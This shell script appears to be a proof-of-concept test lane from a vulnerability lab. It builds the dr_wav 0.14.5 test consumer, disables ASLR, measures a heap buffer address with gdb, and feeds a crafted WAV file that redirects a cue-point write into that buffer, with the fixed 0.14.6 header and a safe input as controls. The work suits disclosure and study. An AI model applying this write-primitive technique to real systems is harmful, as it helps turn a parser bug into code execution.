#!/bin/sh
# Application-owned destination lane for drwav2shell.
#
# Plain (no ASan) build of the UNMODIFIED upstream dr_libs 0.14.5 test
# consumer tests/wav/wav_decoding.c. Under a fixed-ASLR lab process, the
# consumer's own whole-file buffer libsndfile.pFileData shares the heap's high
# 32 bits with the cue pointer. The file alone supplies that pointer's low 32
# bits; the target offset is read from the live process with gdb, not written
# into any source. The chosen word is read back at pFileData before decoding.
# Fixed-header and matching-smpl controls are run with the same file bytes.
set -u
HERE=$(cd "$(dirname "$0")" && pwd -P)
LAB=$(cd "$HERE/.." && pwd -P)
EVID="$HERE/evidence"
BUILD="$HERE/build"
WORK="$BUILD/appdest-work"
mkdir -p "$EVID" "$WORK/tests/testvectors/wav/tests"

npass=0
nfail=0
ok() { npass=$((npass + 1)); echo "PASS $1"; }
no() { nfail=$((nfail + 1)); echo "FAIL $1"; }
expect() { if grep -q -- "$2" "$1"; then ok "$3"; else no "$3"; fi; }
expect_not() { if grep -q -- "$2" "$1"; then no "$3"; else ok "$3"; fi; }

if (cd "$LAB" && sha256sum -c pins/pins.sha256 && sha256sum -c consumer/consumer.sha256) >"$EVID/appdest-pins.out" 2>&1; then
    ok "all pinned bytes verified"
else
    no "all pinned bytes verified"
    cat "$EVID/appdest-pins.out"
fi

if ! command -v gdb >/dev/null 2>&1 || ! command -v setarch >/dev/null 2>&1; then
    echo "SKIP app-destination lane (gdb or setarch unavailable)"
    echo "TOTAL PASS=$npass FAIL=$nfail"
    [ "$nfail" -eq 0 ]
    exit $?
fi

for side in vuln fixed; do
    SRC="$BUILD/plain-$side"
    mkdir -p "$SRC/tests/wav" "$SRC/tests/common"
    cp "$LAB/pins/$side/dr_wav.h" "$SRC/dr_wav.h" || exit 1
    cp "$HERE/upstream/wav/wav_decoding.c" "$HERE/upstream/wav/wav_common.c" "$SRC/tests/wav/" || exit 1
    cp "$HERE/upstream/common/dr_common.c" "$SRC/tests/common/" || exit 1
    if gcc -O0 -g -o "$BUILD/wav_decoding-plain-$side" "$SRC/tests/wav/wav_decoding.c" -ldl -lm -lpthread; then
        ok "build plain $side consumer"
    else
        no "build plain $side consumer"
        exit 1
    fi
done

gen() {
    python3 "$HERE/make_wav.py" "$WORK/tests/testvectors/wav/tests/attack.wav" "$1" 0x4841434b "$2" >"$EVID/appdest-gen.out" 2>&1 || exit 1
}

# Phase 1: measure the consumer's own buffer address in this fixed-ASLR
# process with a safe (matching smpl loop count) input.
gen 0x40 0
(cd "$WORK" && setarch -R gdb -q -batch \
    -ex 'break wav_decoding.c:319' -ex run \
    -ex 'printf "APP_PFDATA=%p\n", libsndfile.pFileData' -ex kill \
    --args "$BUILD/wav_decoding-plain-vuln") >"$EVID/appdest-addr.out" 2>&1
addr=$(grep -o 'APP_PFDATA=0x[0-9a-fA-F]*' "$EVID/appdest-addr.out" | cut -d= -f2)
if [ -z "$addr" ]; then
    no "measure application-owned buffer address"
    exit 1
fi
ok "measured application-owned buffer address $addr"
# The cue point at index 1 is written at hijacked pointer + 24.
ptrlow=$(python3 -c "print(hex($addr - 24))")

readback() {
    (cd "$WORK" && setarch -R gdb -q -batch \
        -ex 'break wav_decoding.c:326' -ex run \
        -ex 'printf "APP_PFDATA=%p\n", libsndfile.pFileData' \
        -ex 'x/2gx libsndfile.pFileData' \
        -ex 'printf "META_COUNT=%u\n", wav.metadataCount' -ex kill \
        --args "$1") >"$2" 2>&1
}

# Phase 2: the crafted file alone retargets the write into that buffer.
gen "$ptrlow" 1
readback "$BUILD/wav_decoding-plain-vuln" "$EVID/appdest-vuln.out"
expect "$EVID/appdest-vuln.out" "0x424242424841434b" "file-chosen words in app-owned buffer"
expect "$EVID/appdest-vuln.out" "META_COUNT=1" "two chunks, one reserved metadata slot"

# Same bytes against the verbatim 0.14.6 header: no desync, no chosen write.
readback "$BUILD/wav_decoding-plain-fixed" "$EVID/appdest-fixed.out"
expect_not "$EVID/appdest-fixed.out" "0x424242424841434b" "fixed: no chosen word in app buffer"

# Safe input: matching smpl loop count, same low pointer field.
gen "$ptrlow" 0
readback "$BUILD/wav_decoding-plain-vuln" "$EVID/appdest-safe.out"
expect_not "$EVID/appdest-safe.out" "0x424242424841434b" "safe: no chosen word in app buffer"
expect "$EVID/appdest-safe.out" "META_COUNT=2" "safe: both chunks accounted"

# Uninstrumented replay of the same file and build.
(cd "$WORK" && setarch -R "$BUILD/wav_decoding-plain-vuln"; echo "rc=$?") >"$EVID/appdest-raw.out" 2>&1
expect "$EVID/appdest-raw.out" "Passed" "unmodified consumer completes with chosen word in its buffer"
expect "$EVID/appdest-raw.out" "rc=0" "unmodified consumer exits cleanly"

echo "TOTAL PASS=$npass FAIL=$nfail"
[ "$nfail" -eq 0 ]
